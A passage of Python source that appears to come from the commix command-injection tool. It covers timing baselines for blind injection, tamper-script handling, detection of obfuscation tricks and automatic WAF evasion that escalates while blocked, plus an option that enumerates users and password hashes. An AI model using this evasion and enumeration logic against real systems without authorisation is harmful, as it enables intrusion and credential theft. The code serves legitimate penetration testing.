    # most samples identical the median is the target's own speed, and a multiple of it is the
    # cutoff. This is the shape a small probe model usually has.
    cutoff = median * (1 + settings.TIME_OUTLIER_MAD_COEFF)
  else:
    return values
  result = [value for value in values if value <= cutoff]
  # Half the sample has to survive, and at least the two a deviation can be taken from. Holding out
  # for the full minimum instead would mean a sample of exactly that size could never lose anything.
  return result if len(result) >= max(2, len(values) // 2) else values

"""
Feed a genuinely non-delayed response time into the rolling baseline model.
"""
def record_probe_response_time(exec_time):
  settings.PROBE_RESPONSE_TIMES.append(exec_time)
  if len(settings.PROBE_RESPONSE_TIMES) > settings.MAX_TIME_RESPONSES:
    settings.PROBE_RESPONSE_TIMES[:] = settings.PROBE_RESPONSE_TIMES[-(settings.MAX_TIME_RESPONSES // 2):]

"""
Record a plain request's response time
"""
def record_baseline_response_time(exec_time):
  settings.RESPONSE_TIMES.append(exec_time)
  if len(settings.RESPONSE_TIMES) > settings.MAX_TIME_RESPONSES:
    settings.RESPONSE_TIMES[:] = settings.RESPONSE_TIMES[-(settings.MAX_TIME_RESPONSES // 2):]

"""
Blocking warm-up: fills the response-time model to MIN_TIME_RESPONSES before the first real timing
comparison, instead of running that decision on a thin or empty model.

Says whether it announced itself, so a caller that goes on to fill a second model can carry on
under the one line rather than printing the same warning over the top of it. Such a caller passes
'close' as False and closes the line itself once its own dots are done.
"""
def warm_up_response_baseline(url, http_request_method, close=True):
  if len(settings.RESPONSE_TIMES) >= settings.MIN_TIME_RESPONSES:
    return False
  warn_msg = settings.TIMING_BASELINE_MSG
  warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
  # The open line says what is being tested, so it is closed rather than written over - and this
  # one is left open in its turn, for the dots below to be counted off on it.
  settings.close_progress_line()
  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
  # A target that has stopped answering returns nothing to record, and the model would never fill:
  # every sample is given a turn, and the ones that failed are not asked for again forever.
  attempts = 0
  max_attempts = settings.MIN_TIME_RESPONSES * 2
  while len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES and attempts < max_attempts:
    attempts += 1
    sample = requests.quick_response_time_sample(url, http_request_method)
    if sample is not None:
      record_baseline_response_time(sample)
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(".")
  if close and settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(" (done)")
  if len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
    warn_msg = "The target answered " + str(len(settings.RESPONSE_TIMES)) + " of the "
    warn_msg += str(settings.MIN_TIME_RESPONSES) + " requests the response-time model asks for. "
    warn_msg += "Time-related results are read against what was collected."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    settings.close_progress_line()
  check_lagging()
  return True

"""
Warns once (whichever call site reaches it first) if the connection is already too jittery to trust automatically, and disables timesec auto-shrinking for the rest of the run. Returns True if lagging is (or was already found to be) detected.
"""
def check_lagging():
  # Settled once, but not off whatever two samples happened to be in hand: a spread read that early
  # says more about the pair than about the connection, so the verdict waits for a model to read.
  if not settings.LAGGING_CHECKED and len(settings.RESPONSE_TIMES) >= settings.MIN_TIME_RESPONSES // 2:
    settings.LAGGING_CHECKED = True
    if statistics.pstdev(settings.RESPONSE_TIMES) > settings.WARN_TIME_STDEV:
      settings.LAGGING_DETECTED = settings.JITTER_SEEN = settings.ADJUST_TIME_DELAY_DISABLED = True
      warn_msg = "Detected considerable lagging in the connection response(s). "
      warn_msg += "Consider using a higher '--time-sec' value (e.g. '10' or more)."
      settings.print_data_to_stdout(settings.print_critical_msg(warn_msg))
  return settings.LAGGING_DETECTED

"""
Current adaptive delay threshold (mean + N*stdev of the baseline), or None if there's no data to compute a deviation from yet.
"""
def _delay_threshold_from(times):
  sample = strip_time_outliers(times)
  if len(sample) < 2:
    return None
  deviation = statistics.pstdev(sample)
  mean = statistics.mean(sample)
  """
  A sample that does not vary is a steady target, not an unusable one. Answering "no threshold"
  there hands the decision to the model of plain requests, which are cheaper than these probes -
  so an ordinary probe reads as delayed, and the check that proves a finding real by asking
  something that cannot be true sees a delay and calls the finding a false positive. The relative
  margin below covers the case on its own.
  """
  margin = max(settings.TIME_STDEV_COEFF * deviation, mean * settings.MIN_RELATIVE_DELAY_MARGIN)
  return max(settings.MIN_VALID_DELAYED_RESPONSE, mean + margin)

# How late an answer has to be before it counts as a delay that was asked for.
def current_delay_threshold():
  # The payload costs more than a plain request - on the file-based path, two PowerShell launches
  # more - so what it costs with nothing held back is the only thing a probe can be judged against.
  # The plain model answers only until enough probes have been seen to have one of their own; the
  # two are never pooled, since a spread that wide reads as deviation and lifts the threshold above
  # the delay it exists to catch.
  if len(settings.PROBE_RESPONSE_TIMES) >= settings.MIN_PROBE_RESPONSES:
    probe_threshold = _delay_threshold_from(settings.PROBE_RESPONSE_TIMES)
    if probe_threshold is not None:
      return probe_threshold
  return _delay_threshold_from(settings.RESPONSE_TIMES)

"""
Time related shell condition. Uses the adaptive threshold once available, else a fixed one.
"""
def time_related_shell(exec_time, timesec):
  if settings.BASELINE_TARGET:
    warm_up_response_baseline(*settings.BASELINE_TARGET)
  lower_limit = current_delay_threshold()
  delayed = exec_time >= lower_limit if lower_limit is not None else exec_time >= timesec

  return delayed

"""
Message regarding time related attcks
"""
def time_related_attaks_msg():
  if not settings.TIME_RELATED_ATTACK_WARNING:
    warn_msg = "Excessive network load may affect the reliability of time-related payloads."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  settings.TIME_RELATED_ATTACK_WARNING = True

"""
Check if defined "--url-reload" option.
"""
def reload_url_msg(technique):
  warn_msg = "On the " + short_technique_label(technique) + ", the '--url-reload' switch is not available."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Decision if the user-defined HTTP authenticatiob type,
is different than the one identified by heuristics.
"""
def identified_http_auth_type(auth_type):
  warn_msg = "Identified different HTTP authentication type ("
  warn_msg += auth_type.lower() + ") than that you have provided ("
  warn_msg += menu.options.auth_type + ")."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  message = "How do you want to proceed? [(C)ontinue/(s)kip] "
  while True:
    proceed_option = (common.read_input(message, default="C", check_batch=True) or "C").strip().lower()
    if proceed_option in ("c", "s", "q"):
      break
    common.invalid_option(proceed_option)
  if proceed_option == "s":
    return False
  elif proceed_option == "c":
    return True
  elif proceed_option == "q":
    raise SystemExit()

"""
Retrieve everything from the supported enumeration options.
"""
def enable_all_enumeration_options():
  # Retrieve current user name.
  menu.options.current_user = True
  # Retrieve current hostname.
  menu.options.hostname = True
  # Retrieve system information.
  menu.options.sys_info = True
  if settings.TARGET_OS == settings.OS.WINDOWS:
    # Check if the current user have admin privileges.
    menu.options.is_admin = True
    # Retrieve PowerShell's version number.
    menu.options.ps_version = True
  else:
    # Check if the current user have root privileges.
    menu.options.is_root = True
  # Retrieve system users.
  menu.options.users = True
  # Retrieve system users privileges.
  menu.options.privileges = True
  # Retrieve system users password hashes.
  menu.options.passwords = True

"""
Parse -p/--skip into their own lists.
"""
def check_provided_parameters():

  # The parameter names given as a list, split the way the option accepts them.
  def parse_parameter_list(raw):
    if raw.startswith("="):
      raw = raw[1:]
    parsed = raw.split(settings.PARAMETER_SPLITTING_REGEX)
    return [p.split("=")[0] if "=" in p else p for p in parsed]

  if menu.options.test_parameter:
    settings.TESTABLE_PARAMETERS_LIST = parse_parameter_list(menu.options.test_parameter)

  if menu.options.skip_parameter:
    settings.SKIP_PARAMETERS_LIST = parse_parameter_list(menu.options.skip_parameter)


"""
-p is an exclusive allowlist, --skip a blocklist, neither given tests everything.
"""
"""
Whether a parameter has already been tested, in the place it is carried in.
"""
def already_tested(place, check_parameter):
  return tested_parameter_name(place, check_parameter) in settings.TESTED_PARAMETERS_LIST

"""
What a parameter is remembered as - the place it is carried in and its name, so that the same name
in two places is two parameters. Written and read through here, or the two drift apart.
"""
def tested_parameter_name(place, check_parameter):
  return str(place) + ":" + str(check_parameter)

"""
Whether any of the given names asks for the header, under any of the names that header answers to.
"""
def header_named(header, names):
  if not names:
    return False
  if isinstance(names, str):
    names = [names]
  wanted = [str(_).lower() for _ in names]
  return any(alias in wanted for alias in settings.HTTP_HEADER_ALIASES.get(header, (header.lower(),)))

"""
Whether any standard header was asked for by name.
"""
def any_header_named(names):
  return any(header_named(header, names) for header in settings.HTTP_HEADER_ALIASES)

# Whether this parameter is one the run was told to test.
def is_parameter_testable(name):
  if settings.TESTABLE_PARAMETERS_LIST:
    return name in settings.TESTABLE_PARAMETERS_LIST
  if settings.SKIP_PARAMETERS_LIST:
    return name not in settings.SKIP_PARAMETERS_LIST
  return True

"""
Identify and print non-listed/skipped parameters that were provided but not part of the request.
"""
def testable_parameters(url, check_parameters):
  if settings.SKIP_PARAMETERS_LIST:
    skipped = [p for p in check_parameters if p in settings.SKIP_PARAMETERS_LIST]
    if skipped:
      info_msg = "Skipping " + check_http_method(url) + " parameter" + ('', 's')[len(skipped) > 1] + " '" + ", ".join(skipped) + "'."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  if settings.TESTABLE_PARAMETERS_LIST:
    settings.TESTABLE_PARAMETERS = bool(
      settings.TESTABLE_PARAMETERS or
      any(p in check_parameters for p in settings.TESTABLE_PARAMETERS_LIST)
    )

    non_listed_params = [p for p in settings.TESTABLE_PARAMETERS_LIST if p not in check_parameters]
    if non_listed_params:
      http_method = check_http_method(url)
      if http_method not in settings.METHODS_WITH_NON_LISTED_PARAMS:
        settings.METHODS_WITH_NON_LISTED_PARAMS.append(http_method)
        warn_msg = "Provided parameter" + ("s" if len(non_listed_params) != 1 else "") + " '"
        warn_msg += ", ".join(non_listed_params) + "'" + (" are", " is")[len(non_listed_params) == 1]
        warn_msg += " not inside the " + http_method + "."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Lists available tamper scripts
"""
def list_tamper_scripts():
  info_msg = "Listing available tamper scripts."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  
  if menu.options.list_tampers:
    message = ""
    
    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
      with open(script, "rb") as script_file:
        content = script_file.read().decode(settings.DEFAULT_CODEC)
      match = re.search(r"About:(.*)\n", content)
      if match:
        comment = match.group(1).strip()
        # Capitalize the first letter of the comment
        comment = comment[0].upper() + comment[1:] if comment else comment
        script_name = os.path.basename(script)
        message += (
          Style.BRIGHT
          + script_name
          + Style.RESET_ALL
          + " - "
          + comment
          + "\n"
        )
    
    settings.print_data_to_stdout(message.rstrip())
    
"""
Shared building blocks for tamper scripts' own dependencies() checks - each script decides which
of these apply to it, instead of a central list here trying to track every script's constraints.
"""
"""
Both of these test the operating system, because that is what commix knows - but what they are
really enforcing is the syntax a script is written in, so that is what they say. A shell is named
rather than the host it usually comes with.
"""
def tamper_dep_windows_only(tamper_name):
  if settings.TARGET_OS != settings.OS.WINDOWS:
    return "The '" + tamper_name + ".py' tamper script needs 'cmd.exe'. Skipping tamper script."

# Why this script cannot be applied to a Windows target.
def tamper_dep_unix_only(tamper_name):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return "The '" + tamper_name + ".py' tamper script needs a POSIX shell. Skipping tamper script."

def tamper_dep_eval_incompatible(tamper_name):
  """
  What these scripts cannot survive is the sink, not the technique that reaches it.

  Asked of the classic technique alone, they were skipped there and applied everywhere else - and
  code injection is now proven time-based and file-based as well, so the payloads they would have
  corrupted were being sent by every technique but the one that refused them.
  """
  if menu.options.eval_sink:
    return "Code injection (i.e. '--eval') does not support the usage of '" + tamper_name + ".py'. Skipping tamper script."

# Why this script cannot be applied where no time-related technique is in scope.
def tamper_dep_time_related_only(tamper_name):
  time_related_in_scope = len(menu.options.tech) == 0 or "t" in menu.options.tech or "f" in menu.options.tech
  if not time_related_in_scope:
    return "Only time-related techniques support the usage of '" + tamper_name + ".py'."

# Why this script cannot be applied alongside an interpreter of the user's own.
def tamper_dep_interpreter_incompatible(tamper_name):
  if menu.options.interpreter:
    return "Option '--interpreter' does not support the usage of '" + tamper_name + ".py'. Skipping tamper script."

"""
Undo a per-character obfuscation (obf_char inserted before each letter) on any whole word that settings.IGNORE_TAMPER_TRANSFORMATION says must survive intact (e.g. shell keywords like 'if'/'then').
"""
def tamper_restore_ignored_words(payload, obf_char):
  for word in sorted(settings.IGNORE_TAMPER_TRANSFORMATION, key=len, reverse=True):
    obf_word = "".join(obf_char + char if re.match(settings.TAMPER_MODIFICATION_LETTERS, char) else char for char in word)
    if obf_word != word and obf_word in payload:
      payload = payload.replace(obf_word, word)
  whitespace = settings.WHITESPACES[0] if len(settings.WHITESPACES) != 0 else settings.SINGLE_WHITESPACE
  pattern = r"\b(for|read)" + re.escape(whitespace) + r"((?:" + re.escape(obf_char) + r")?\w(?:(?:" + re.escape(obf_char) + r")?\w)*)"
  return re.sub(pattern, lambda x: x.group(1) + whitespace + x.group(2).replace(obf_char, ""), payload)

"""
Apply a letter-modification regex only outside double-quoted spans (Windows/cmd.exe only) -
caret (and similar per-letter escapes) has no effect inside double quotes, so applying it there
just corrupts literal quoted text (e.g. "tokens=*", "powershell.exe ...") instead of obfuscating it.
"""
def tamper_modify_letters_outside_quotes(payload, repl):
  parts = re.split(r'("[^"]*")', payload)
  return "".join(part if part.startswith('"') else re.sub(settings.TAMPER_MODIFICATION_LETTERS, repl, part) for part in parts)

"""
Apply "transform" outside single-quoted spans only - single quotes suppress expansion, so anything injected there stays literal and corrupts the argument.
"""
def tamper_outside_single_quotes(payload, transform):
  # cmd.exe gives a single quote no meaning of its own, so a span in them is not a literal to be
  # left alone - the whitespace inside a 'for /f' command would go out unencoded.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return transform(payload)
  parts = re.split(r"('[^']*')", payload)
  return "".join(part if part.startswith("'") else transform(part) for part in parts)

"""
Interleave obf_char before each tamper-modification-letter match (Unix-only) - the shared logic behind backslashes/dollaratsigns/singlequotes.
"""
def interleave_char_tamper(payload, obf_char):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return payload
  payload = tamper_outside_single_quotes(payload, lambda part: re.sub(settings.TAMPER_MODIFICATION_LETTERS, lambda x: obf_char + x[0], part))
  return tamper_restore_ignored_words(payload, obf_char)

"""
base64encode/hexencode consume the whole payload as one blob, so they can't coexist with
space2plus rewriting whitespace inside it first - fatal (not a skippable warning like the rest).
"""
def tamper_check_space2plus_conflict(tamper_name):
  if len(settings.WHITESPACES) != 0 and settings.WHITESPACES[0] == _urllib.parse.quote_plus(settings.SINGLE_WHITESPACE):
    err_msg = "Tamper script '" + tamper_name + "' is unlikely to work when combined with the tamper script 'space2plus'."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Whether to answer the detected WAF/IPS with evasion, asked once and kept for the rest of the run.
A tamper script provided by the user is left alone - the combination is their call, not ours.
"""
def waf_evasion_consent():
  if settings.WAF_EVASION_CONSENT is None:
    # The evasion is only ours to choose while the user has not chosen one of their own.
    if not settings.WAF_ENABLED or menu.options.skip_waf or settings.USER_APPLIED_TAMPER or menu.options.tamper:
      return False
    message = "Do you want commix to try bypassing it? [Y/n] "
    settings.WAF_EVASION_CONSENT = common.read_input(message, default="Y", check_batch=True).lower() != "n"
  return settings.WAF_EVASION_CONSENT

"""
Frame the payload as chunks, which hides it from a filter without changing what the target
receives. This says nothing about the target's operating system, so it can be used right away.
"""
def apply_waf_transport_evasion():
  if menu.options.chunked or not settings.USER_DEFINED_POST_DATA or not waf_evasion_consent():
    return False
  menu.options.chunked = True
  settings.WAF_EVASION_APPLIED = "chunked"
  # Persistent connections cannot carry a chunked body, so that choice has to be revisited.
  init_keep_alive()
  info_msg = "Turning on chunked transfer-encoding, to get the payload past it."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  return True

"""
Turn on the tamper scripts that suit the target, once its operating system is known.
"""
def waf_evasion_profiles():
  return settings.WAF_EVASION_PROFILE["windows" if settings.TARGET_OS == settings.OS.WINDOWS else "unix"]

# Turn on the tamper scripts that a blocked payload calls for.
def apply_waf_evasion():
  if menu.options.tamper or not waf_evasion_consent():
    return

  profile = waf_evasion_profiles()[settings.WAF_EVASION_TIER]
  menu.options.tamper = profile
  settings.WAF_EVASION_APPLIED = (settings.WAF_EVASION_APPLIED + "," + profile).strip(",")
  # The combination was chosen on purpose here, so the warning about their number does not apply.
  settings.TAMPER_WARNING_SHOWN = True
  info_msg = "Turning on the '" + profile.replace(",", "', '") + "' tamper scripts, to get the payload past it."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Step the evasion up a tier, when what is already tampered is still being blocked.
"""
def escalate_waf_evasion(on_block=True):
  if not settings.WAF_EVASION_APPLIED or not settings.WAF_EVASION_CONSENT:
    return False
  # A blocked response is counted, while techniques having run out speaks for itself.
  if on_block:
    settings.WAF_BLOCKS_SINCE_EVASION += 1
    if settings.WAF_BLOCKS_SINCE_EVASION < settings.WAF_ESCALATION_THRESHOLD:
      return False

  profiles = waf_evasion_profiles()
  if settings.WAF_EVASION_TIER + 1 >= len(profiles):
    return False

  settings.WAF_BLOCKS_SINCE_EVASION = 0
  settings.WAF_EVASION_TIER += 1
  profile = profiles[settings.WAF_EVASION_TIER]
  menu.options.tamper = profile
  # The scripts in use are rebuilt from scratch, so the ones being replaced are not kept on.
  settings.MULTI_ENCODED_PAYLOAD = []
  tamper_scripts(stored_tamper_scripts=True)
  settings.WAF_EVASION_APPLIED = ("chunked," if menu.options.chunked else "") + profile
  settings.WAF_EVASION_ESCALATED = True
  warn_msg = "Still being blocked, so stepping the evasion up to the '" + profile.replace(",", "', '") + "' tamper scripts."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  return True

"""
Tamper script checker
"""
def tamper_scripts(stored_tamper_scripts):
  if menu.options.tamper:
    # Check the provided tamper script(s)
    available_scripts = []
    raw_scripts = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower())
    provided_scripts = list(dict.fromkeys(script.strip() for script in raw_scripts if script.strip()))
    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
      available_scripts.append(os.path.basename(script.split(".py")[0]))
    for script in provided_scripts:
      if script in available_scripts:
        pass
      else:
        err_msg = "The '" + script + "' tamper script does not exist. "
        err_msg += "Use the '--list-tampers' switch for listing available tamper scripts."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()
    for first, second in settings.INCOMPATIBLE_TAMPER_SCRIPTS:
      if first in provided_scripts and second in provided_scripts:
        err_msg = "Tamper script '" + first + "' is unlikely to work in combination with the tamper script '" + second + "'."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()
    priorities = {}
    for script in provided_scripts:
      if script not in settings.MULTI_ENCODED_PAYLOAD:
        settings.MULTI_ENCODED_PAYLOAD.append(script)
      if not stored_tamper_scripts:
        info_msg = "Loading tamper module '" + script + "'."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      try:
        module = importlib.import_module("src.tamper." + script)
      except (ImportError, ValueError):
        continue
      if not hasattr(module, "__tamper__"):
        err_msg = "Missing variable '__tamper__' "
        err_msg += "in tamper script '" + script + "'."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()
      priorities[script] = getattr(module, "__priority__", settings.PRIORITY.NORMAL)
      warn_msg = module.dependencies() if hasattr(module, "dependencies") else None
      if warn_msg:
        # Always warn and drop incompatible scripts, including resumed techniques.
        settings.print_once(warn_msg)
        if script in settings.MULTI_ENCODED_PAYLOAD:
          settings.MULTI_ENCODED_PAYLOAD.remove(script)

    # Respect each tamper script's declared execution tier; offer to auto-sort conflicting --tamper order.
    current_order = [script for script in settings.MULTI_ENCODED_PAYLOAD if script in priorities]
    sorted_order = sorted(current_order, key=lambda script: -priorities[script])
    if current_order != sorted_order:
      warn_msg = "It appears that you have mixed the order of the provided tamper scripts. "
      warn_msg += "Do you want to auto resolve this? [Y/n] "
      if common.read_input(warn_msg, default="Y", check_batch=True).lower() != "n":
        settings.MULTI_ENCODED_PAYLOAD = sorted_order + [script for script in settings.MULTI_ENCODED_PAYLOAD if script not in priorities]

    # Using too many tamper scripts is usually not a good idea. :P
    _ = False
    if len(provided_scripts) >= 3 and not settings.LOAD_SESSION:
      warn_msg = "Using too many tamper scripts "
      _ = True
    elif len([x for x in provided_scripts if any(y in x for y in ["nested", "doublequotes"])]) == 2 and not settings.LOAD_SESSION:
      _ = True
      warn_msg = "The combination of the provided tamper scripts "
    if _ and not settings.TAMPER_WARNING_SHOWN:
      settings.TAMPER_WARNING_SHOWN = True
      warn_msg += "is not a good idea (may cause false positive / negative results)."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Enable a tamper script by name, skipping duplicates.
"""
def _enable_tamper_script(tamper_name):
  if settings.TAMPER_SCRIPTS[tamper_name]:
    return
  provided = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower()) if menu.options.tamper else []
  if tamper_name in provided:
    return
  menu.options.tamper = (menu.options.tamper + "," + tamper_name) if menu.options.tamper else tamper_name

"""
Check for modified whitespaces.
"""
def whitespace_check(payload):

  _ = []
  # As they appear in a payload now: written out, and encoded only on the way to the wire.
  whitespaces = ["${IFS}", "+", "\t", "\v", " "]
  for whitespace in whitespaces:
    if whitespace in payload:
      _.append(whitespace)

  # Enable the "space2ifs" tamper script.
  if "${IFS}" in _:
    _enable_tamper_script('space2ifs')
    settings.WHITESPACES[0] = "${IFS}"

  # Enable the "space2plus" tamper script.
  elif "+" in _ and payload.count("+") >= 2:
    _enable_tamper_script('space2plus')
    settings.WHITESPACES[0] = "+"

  # Enable the "space2htab" tamper script.
  elif "%09" in _:
    _enable_tamper_script('space2htab')
    settings.WHITESPACES[0] = "%09"

  # Enable the "space2vtab" tamper script.
  elif "%0b" in _:
    _enable_tamper_script('space2vtab')
    settings.WHITESPACES[0] = "%0b"

  # Default whitespace
  else :
    settings.WHITESPACES[0] = "%20"

  # Enable the "multiplespaces" tamper script.
  count_spaces = payload.count(settings.WHITESPACES[0])
  if count_spaces > 15:
    if not settings.TAMPER_SCRIPTS['multiplespaces']:
      _enable_tamper_script('multiplespaces')
      settings.WHITESPACES[0] = settings.WHITESPACES[0] * int(count_spaces / 2)

"""
Check for symbols (i.e. "`", "^", "$@" etc) between the characters of the generated payloads.
"""
def other_symbols(payload):
  # Implemented check to replace each character in a user-supplied OS command with a random case.
  if payload.count("|tr \"[A-Z]\" \"[a-z]\"") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('randomcase')

  # Check for reversed (characterwise) user-supplied operating system commands.
  if payload.count("|rev") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('rev')

  # Check for (multiple) backticks (instead of "$()") for command substitution on the generated payloads.
  if payload.count("`") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('backticks')
    settings.USE_BACKTICKS = True

  # Check for caret symbol
  if payload.count("^") >= 10:
    _enable_tamper_script('caret')

  # Check for dollar sign followed by an at-sign
  if payload.count("$@") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('dollaratsigns')

  # Check for uninitialized variable
  if len(re.findall(r'\${.*?}', payload)) >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('uninitializedvariable')

  # Check for environment variable value variable
  if payload.count("${PATH%%u*}") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('slash2env')

"""
Check for (multiple) added back slashes between the characters of the generated payloads.
"""
def check_backslashes(payload):
  # Check for single quotes
  if payload.count("\\") >= 15 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('backslashes')

"""
Check for quotes in the generated payloads.
"""
def check_quotes(payload):
  # Check for double quotes around of the generated payloads.
  if payload.endswith("\"") and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('nested')

  # Check for (multiple) added double-quotes between the characters of the generated payloads.
  if payload.count("\"") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('doublequotes')

  # Check for (multiple) added single-quotes between the characters of the generated payloads.
  if payload.count("''") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('singlequotes')

"""
Charset matches alone do not prove encoding; require a mostly printable decoded result to confirm a real encoding.
"""
def decoded_text_is_plausible(text):
  if not text:
    return False
  printable = sum(1 for char in text if char in string.printable and char not in "\x0b\x0c")
  return printable / len(text) >= settings.ENCODING_PLAUSIBILITY_RATIO

"""
Check for applied (hex / b64) encoders.
"""
def check_encoders(payload):
  is_decoded = False
  encoded_with = ""
  check_value = payload
  long_enough = len(check_value.strip()) >= settings.ENCODING_MIN_LENGTH

  settings.MULTI_ENCODED_PAYLOAD = list(dict.fromkeys(settings.MULTI_ENCODED_PAYLOAD))
  for encode_type in list(settings.MULTI_ENCODED_PAYLOAD):
    if encode_type == 'base64encode' or encode_type == 'hexencode':
      while True:
        message = "Do you want to keep using the '" + encode_type + "' tamper script? [y/N] "
        procced_option = common.read_input(message, default="N", check_batch=True)
        if procced_option in settings.CHOICE_YES:
          break
        elif procced_option in settings.CHOICE_NO:
          if settings.VERBOSITY_LEVEL != 0:
            debug_msg = "Unloading the '" + encode_type + "' tamper script."
            settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
          settings.MULTI_ENCODED_PAYLOAD.remove(encode_type)
          break
        elif procced_option in settings.CHOICE_QUIT:
          raise SystemExit()
        else:
          common.invalid_option(procced_option)
          pass

  if long_enough and (len(check_value.strip()) % 4 == 0) and \
    re.match(settings.BASE64_RECOGNITION_REGEX, check_value) and \
    not re.match(settings.HEX_RECOGNITION_REGEX, check_value):
      _payload = base64.b64decode(check_value)
      try:
        decoded_text = _payload.decode(settings.DEFAULT_CODEC)
        if not "\\x" in decoded_text and decoded_text_is_plausible(decoded_text):
          settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
          decoded_payload = _payload
          encoded_with = "base64"
          if re.match(settings.HEX_RECOGNITION_REGEX, check_value):
            decoded_payload, _ = hexdecode(decoded_payload)
            if _:
              settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
              encoded_with = "hex"
      except Exception:
        pass

  elif long_enough and re.match(settings.HEX_RECOGNITION_REGEX, check_value):
    decoded_payload, _ = hexdecode(check_value)
    if _ and decoded_text_is_plausible(decoded_payload):
      settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
      encoded_with = "hex"
      if (len(check_value.strip()) % 4 == 0) and \
        re.match(settings.BASE64_RECOGNITION_REGEX, decoded_payload) and \
        not re.match(settings.HEX_RECOGNITION_REGEX, decoded_payload):
          _payload = base64.b64decode(check_value)
          try:
            decoded_text = _payload.decode(settings.DEFAULT_CODEC)
            if not "\\x" in decoded_text and decoded_text_is_plausible(decoded_text):
              settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
              decoded_payload = _payload
              encoded_with = "base64"
          except Exception:
            pass
  else:
    decoded_payload = payload

  if len(encoded_with) != 0:
    is_decoded = True

  if is_decoded:
    while True:
      message = "The value appears to already be " + encoded_with + "-encoded. "
      message += "Do you want to load the '" + encoded_with + "encode' tamper script to keep it that way? [Y/n] "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        break
      elif procced_option in settings.CHOICE_NO:
        settings.MULTI_ENCODED_PAYLOAD.remove(encoded_with + "encode")
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Skipping load the '" + encoded_with + "encode' tamper script."
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
        break
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)
        pass

  if is_decoded and (encoded_with + "encode") in settings.MULTI_ENCODED_PAYLOAD:
    tamper_name = encoded_with + "encode"
    provided = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower()) if menu.options.tamper else []
    if tamper_name not in provided:
      menu.options.tamper = (menu.options.tamper + "," + tamper_name) if menu.options.tamper else tamper_name

  if is_decoded:
    return _urllib.parse.quote(decoded_payload), encoded_with
  else:
    return payload, encoded_with

"""
Recognise the payload.
"""
def recognise_payload(payload):
  if "usleep" in payload and settings.TARGET_OS != settings.OS.WINDOWS:
    _enable_tamper_script('sleep2usleep')

  elif "timeout" in payload:
    _enable_tamper_script('sleep2timeout')

  return check_encoders(payload)
  
"""
Restore stored payloads and tampers as-is when resuming a session; skip re-detection and prompts.
"""
def check_for_stored_tamper(payload):
  whitespace_check(payload)
  other_symbols(payload)
  check_backslashes(payload)
  check_quotes(payload)
  tamper_scripts(stored_tamper_scripts=True)

"""
Run a tamper script's tamper(), turning an exception or a non-string return value into a clean error instead of crashing raw or corrupting the payload.
"""
def _apply_tamper(script_name, module, payload):
  try:
    result = module.tamper(payload)
  except Exception as err:
    err_msg = "Tamper script '" + script_name + "' raised an unhandled error (" + str(err) + ")."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()
  if not isinstance(result, str):
    err_msg = "Tamper script '" + script_name + "' returned an invalid payload type ('" + type(result).__name__ + "')."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()
  return result

"""
Apply tampers in dependency order across groups, preserving the user's --tamper order within each group.
"""
def perform_payload_modification(payload):
  try:
    settings.RAW_PAYLOAD = payload.replace(settings.WHITESPACES[0], settings.SINGLE_WHITESPACE)
  except IndexError:
    settings.RAW_PAYLOAD = payload

  for script in list(settings.MULTI_ENCODED_PAYLOAD):
    if script == 'xforwardedfor':
      continue
